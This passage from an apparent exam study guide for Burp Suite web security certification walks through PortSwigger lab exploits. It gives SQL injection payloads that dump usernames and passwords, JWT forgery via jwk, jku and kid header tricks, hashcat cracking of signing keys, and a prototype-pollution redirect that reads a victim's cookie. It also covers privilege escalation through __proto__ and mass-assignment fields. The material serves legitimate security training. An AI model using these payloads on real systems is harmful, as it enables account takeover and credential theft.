<p dir="auto"><strong>Final</strong> step is to the <strong>dump data</strong> from the username and passwords columns.</p>
</blockquote>
<div class="highlight highlight-source-sql notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--"><pre><span class="pl-s"><span class="pl-pds">'</span>+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--</span></pre></div>
<blockquote>
<p dir="auto"><strong>EXTRA:</strong> If you only have one column to extract text data, then concatenate multiple values in a single reflected output field using SQL syntax <code>||</code> characters from the database.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"><pre class="notranslate"><code>'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/manual-sqli.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/manual-sqli.png" alt="manual-sqli.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" rel="nofollow">PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Visual error-based SQLi</h3><a id="user-content-visual-error-based-sqli" class="anchor" aria-label="Permalink: Visual error-based SQLi" href="#visual-error-based-sqli"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Adding a single quote to the end of the <code>TrackingId</code> cookie value, we can <em><strong>identify</strong></em> and confirm the SQL Injection based on the message in the response.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-visual-error-based-sqli.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-visual-error-based-sqli.png" alt="identify-visual-error-based-sqli.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The two payloads validate administrator record is the first record, and then to retrieve the password for the Administrator account from the <code>user</code> table in the database, from the columns <code>username</code> and <code>password</code>.</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;
  
TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;"><pre class="notranslate"><code>TrackingId=x'||CAST((SELECT username FROM users LIMIT 1) AS int)--;
  
TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
</code></pre></div>
<blockquote>
<p dir="auto">Due to the cookie value length limit the payload is shortened by using <code>limit 1</code>, and the actual cookie value replace with just a letter <code>x</code>. SQL Injection used the <a href="https://portswigger.net/web-security/sql-injection/blind" rel="nofollow">CAST function</a>.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/SQL-Injection-CAST-function.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/SQL-Injection-CAST-function.png" alt="SQL Injection CAST function" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based" rel="nofollow">PortSwigger Lab: Visible error-based SQL injection</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">JWT</h2><a id="user-content-jwt" class="anchor" aria-label="Permalink: JWT" href="#jwt"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#manual-sqli">JWT bypass via JWK</a><br>
<a href="#jwt-weak-secret">JWT Weak secret</a><br>
<a href="#jwt-kid-header">JWT kid header</a><br>
<a href="#jwt-arbitrary-jku-header">JWT arbitrary jku header</a></p>
<blockquote>
<p dir="auto">JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">JWT bypass via JWK</h3><a id="user-content-jwt-bypass-via-jwk" class="anchor" aria-label="Permalink: JWT bypass via JWK" href="#jwt-bypass-via-jwk"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">The burp scanner <em><strong>identify</strong></em> vulnerability in server as, <strong>JWT self-signed JWK header supported</strong>. Possible to exploit it through failed check of the provided key source.<br>
<strong>jwk (JSON Web Key)</strong> - Provides an embedded JSON object representing the key.</p>
</blockquote>
<blockquote>
<p dir="auto">Authentication bypass Exploit steps via jwk header injection:</p>
</blockquote>
<ol dir="auto">
<li>New RSA Key</li>
<li>In request JWT payload, change the value of the <strong>sub claim</strong> to administrator</li>
<li>Select Attack, then select <strong>Embedded JWK</strong> with newly generated RSA key</li>
<li>Observe a <code>jwk</code> parameter now contain our public key, sending request result in access to admin portal</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwk-header.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwk-header.png" alt="jwk header" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection" rel="nofollow">PortSwigger Lab: JWT authentication bypass via jwk header injection</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">JWT Weak secret</h3><a id="user-content-jwt-weak-secret" class="anchor" aria-label="Permalink: JWT Weak secret" href="#jwt-weak-secret"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Brute force weak JWT signing key using <code>hashcat</code>.</p>
</blockquote>
<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="hashcat -a 0 -m 16500 &lt;YOUR-JWT&gt; /path/to/jwt.secrets.list "><pre>hashcat -a 0 -m 16500 <span class="pl-k">&lt;</span>YOUR-JWT<span class="pl-k">&gt;</span> /path/to/jwt.secrets.list </pre></div>
<blockquote>
<p dir="auto">Hashcat result provide the secret, to be used to generate a forged signing key.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key" rel="nofollow">PortSwigger JWT authentication bypass via weak signing key</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">JWT kid header</h3><a id="user-content-jwt-kid-header" class="anchor" aria-label="Permalink: JWT kid header" href="#jwt-kid-header"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the <code>kid</code> parameter in JWT header to fetch the relevant key from its file system.<br>
Generate a new <strong>Symmetric Key</strong> and replace <code>k</code> property with the base64 null byte <code>AA==</code>, to be used when signing the JWT.<br>
<strong>kid (Key ID)</strong> - Provides an ID that servers can use to identify the correct key in cases where there are multiple keys to choose from.</p>
</blockquote>
<blockquote>
<p dir="auto">JWS</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="{
    &quot;kid&quot;: &quot;../../../../../../../dev/null&quot;,
    &quot;alg&quot;: &quot;HS256&quot;
}"><pre class="notranslate"><code>{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
</code></pre></div>
<blockquote>
<p dir="auto">Payload</p>
</blockquote>
<div class="snippet-clipboard-content notranslate position-relative overflow-auto" data-snippet-clipboard-copy-content="{
    &quot;iss&quot;: &quot;portswigger&quot;,
    &quot;sub&quot;: &quot;administrator&quot;,
    &quot;exp&quot;: 1673523674
}"><pre class="notranslate"><code>{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1673523674
}
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt.png" alt="jwt" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal" rel="nofollow">PortSwigger Lab: JWT authentication bypass via kid header path traversal</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">JWT arbitrary jku header</h3><a id="user-content-jwt-arbitrary-jku-header" class="anchor" aria-label="Permalink: JWT arbitrary jku header" href="#jwt-arbitrary-jku-header"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Burp scanner identified vulnerability stating the application appears to trust the <code>jku</code> header of the JWT found in the manual insertion point. It fetched a public key from an arbitrary URL provided in this header and attempted to use it to verify the signature.<br>
<strong>jku (JSON Web Key Set URL)</strong> - Provides a URL from which servers can fetch keys containing the correct key.</p>
</blockquote>
<blockquote>
<p dir="auto">Exploit steps to Upload a malicious JWK Set, then Modify and sign the JWT:</p>
</blockquote>
<ol dir="auto">
<li>Generate <strong>New RSA Key pair</strong> automatically, and ignore the size.</li>
<li>On the exploit server body create <strong>empty JWK</strong> <code>{ "keys": [ ] }</code>.</li>
<li><strong>Copy Public Key as JWK</strong> from the new RSA key pair generate in previous step, in between the exploit body square brackets <code>[ paste ]</code>.</li>
<li>Copy kid value of generate RSA key into the <code>/admin</code> request JWT header <code>kid</code> value.</li>
<li>Set new <code>jku</code> parameter to the value of the exploit server URL <code>https://exploit-server.net/exploit</code>.</li>
<li>Change JWT payload value of the <code>sub</code> claim to <code>administrator</code>.</li>
<li>On the <code>/admin</code> request in repeat, at bottom of the JSON Web Token tab, click <code>Sign</code>.</li>
<li>On Sign option, then select the <code>RSA signing key</code> that was generated in the previous steps.</li>
<li>Send request, and gain access to admin portal.</li>
</ol>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt-jku-header-setup.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt-jku-header-setup.png" alt="jwt-jku-header-setup.png" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">The exploit server hosting the JWK public key content.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{ &quot;keys&quot;: [
{
    &quot;kty&quot;: &quot;RSA&quot;,
    &quot;e&quot;: &quot;AQAB&quot;,
    &quot;kid&quot;: &quot;3c0171bd-a8cf-45b5-839f-645fa2a57009&quot;,
    &quot;n&quot;: &quot;749eJdyiwAYYVV    &lt;snip&gt;   F8tsQ_zu23DhdoePay3JlYXmza9DWDw&quot;
}
]}"><pre>{ <span class="pl-ent">"keys"</span>: [
{
    <span class="pl-ent">"kty"</span>: <span class="pl-s"><span class="pl-pds">"</span>RSA<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"e"</span>: <span class="pl-s"><span class="pl-pds">"</span>AQAB<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"kid"</span>: <span class="pl-s"><span class="pl-pds">"</span>3c0171bd-a8cf-45b5-839f-645fa2a57009<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"n"</span>: <span class="pl-s"><span class="pl-pds">"</span>749eJdyiwAYYVV    &lt;snip&gt;   F8tsQ_zu23DhdoePay3JlYXmza9DWDw<span class="pl-pds">"</span></span>
}
]}</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/jwt-jku-header-exploit-server.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/jwt-jku-header-exploit-server.png" alt="jwt-jku-header-exploit-server.png" style="max-width: 100%;"></a></p>
<p dir="auto"><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection" rel="nofollow">PortSwigger Lab: JWT authentication bypass via jku header injection</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">ProtoType Pollution</h2><a id="user-content-prototype-pollution" class="anchor" aria-label="Permalink: ProtoType Pollution" href="#prototype-pollution"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Attacker add arbitrary properties to global JavaScript object prototypes, which is inherited by user-defined objects that lead to client-side DOM XSS or server-side code execution.</p>
</blockquote>
<p dir="auto"><a href="#client-side-proto">Client-Side Proto</a><br>
<a href="#server-side-proto">Server-Side Proto</a><br>
<a href="https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution" rel="nofollow">Dom Invader Enable Prototype Pollution</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Client-Side Proto</h3><a id="user-content-client-side-proto" class="anchor" aria-label="Permalink: Client-Side Proto" href="#client-side-proto"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">A target is vulnerable to DOM XSS via client side prototype pollution. <strong><a href="#dom-invader">DOM Invader</a></strong> will <em><strong>identify</strong></em> the gadget and using a hosted payload to performing phishing directed at the victim and steal their cookie.</p>
</blockquote>
<blockquote>
<p dir="auto">Exploit server Body section, host an exploit that will navigate the victim to a malicious URL.</p>
</blockquote>
<div class="highlight highlight-text-html-basic notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&lt;script&gt;
    location=&quot;https://TARGET.NET/#__proto__[hitCallback]=alert%28document.cookie%29&quot;
&lt;/script&gt;  "><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
    <span class="pl-s1">location</span><span class="pl-c1">=</span><span class="pl-s">"https://TARGET.NET/#__proto__[hitCallback]=alert%28document.cookie%29"</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>  </pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/proto-pollution.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/proto-pollution.png" alt="Proto pollution" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Above image show the <strong>Deliver to Victim</strong> phishing request being send.</p>
</blockquote>
<p dir="auto"><a href="https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries" rel="nofollow">PortSwigger Lab: Client-side prototype pollution in third-party libraries</a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/proto-pollution.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/proto-pollution.png" alt="Proto pollution" style="max-width: 100%;"></a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Server-Side Proto</h3><a id="user-content-server-side-proto" class="anchor" aria-label="Permalink: Server-Side Proto" href="#server-side-proto"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">To <em><strong>identify</strong></em> Proto pollution, insert the follow into a JSON post request when updating a user profile information authenticated as low privileged role.<br>
See instruction video by <a href="https://youtu.be/oYAxbRiB0Jk" rel="nofollow">Trevor TJCHacking</a> about PrivEsc via server-side prototype pollution.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;__proto__&quot;: {
    &quot;foo&quot;:&quot;bar&quot;
}"><pre><span class="pl-ent">"__proto__"</span>: {
    <span class="pl-ent">"foo"</span>:<span class="pl-s"><span class="pl-pds">"</span>bar<span class="pl-pds">"</span></span>
}</pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify__proto__.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify__proto__.png" alt="identify proto" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Observe the <code>isAdmin</code> property and resend the POST update account with the <code>__proto__</code> payload below to elevate our access role to Administrator.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="&quot;__proto__&quot;: {
    &quot;isAdmin&quot;:true
}"><pre><span class="pl-ent">"__proto__"</span>: {
    <span class="pl-ent">"isAdmin"</span>:<span class="pl-c1">true</span>
}</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution" rel="nofollow">PortSwigger Lab: Privilege escalation via server-side prototype pollution</a></p>
<hr>
<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">API Testing</h2><a id="user-content-api-testing" class="anchor" aria-label="Permalink: API Testing" href="#api-testing"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto"><a href="#exploiting-a-mass-assignment">Exploiting a mass assignment</a><br>
<a href="#api-reset-password-parameter-pollution">API Reset Password Parameter Pollution</a></p>
<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Exploiting a mass assignment</h3><a id="user-content-exploiting-a-mass-assignment" class="anchor" aria-label="Permalink: Exploiting a mass assignment" href="#exploiting-a-mass-assignment"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">API performing GET request and directly after a POST request and in the POST request notice additional JSON parameters in the body of response, indicate hidden parameter fields.
Add hidden fields such as <code>{"admin":true}</code> can elevate access to higher privileged users or gain sensitive information about user.</p>
</blockquote>
<blockquote>
<p dir="auto">In below lab exercise the ecommerce site have a discount parameter and adding it with value of 100 allow for the product to be free on checkout.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/mass-assignment-hidden-parameter.png"><img src="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/mass-assignment-hidden-parameter.png" alt="Mass assignment hidden parameter" style="max-width: 100%;"></a></p>
<blockquote>
<p dir="auto">Privilege escalation using API endpoints hidden parameters in POST or PATCH HTTP verb request.</p>
</blockquote>
<div class="highlight highlight-source-json notranslate position-relative overflow-auto" dir="auto" data-snippet-clipboard-copy-content="{
    &quot;username&quot;: &quot;carlos&quot;,
    &quot;email&quot;: &quot;carlos@exploit.com&quot;,
    &quot;isAdminLevel&quot;: true
}"><pre>{
    <span class="pl-ent">"username"</span>: <span class="pl-s"><span class="pl-pds">"</span>carlos<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"email"</span>: <span class="pl-s"><span class="pl-pds">"</span>carlos@exploit.com<span class="pl-pds">"</span></span>,
    <span class="pl-ent">"isAdminLevel"</span>: <span class="pl-c1">true</span>
}</pre></div>
<p dir="auto"><a href="https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability" rel="nofollow">PortSwigger Lab: Exploiting a mass assignment vulnerability</a></p>
